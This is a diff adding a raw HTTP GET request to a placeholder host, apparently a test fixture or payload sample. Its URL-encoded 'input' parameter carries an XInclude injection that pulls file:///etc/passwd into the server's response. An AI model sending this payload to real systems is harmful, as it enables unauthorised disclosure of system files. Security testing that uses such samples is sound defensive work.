@@ -1,0 +1,4 @@
+GET /a?input=%3Cx%2Bxmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%2Bhref%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Fx%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
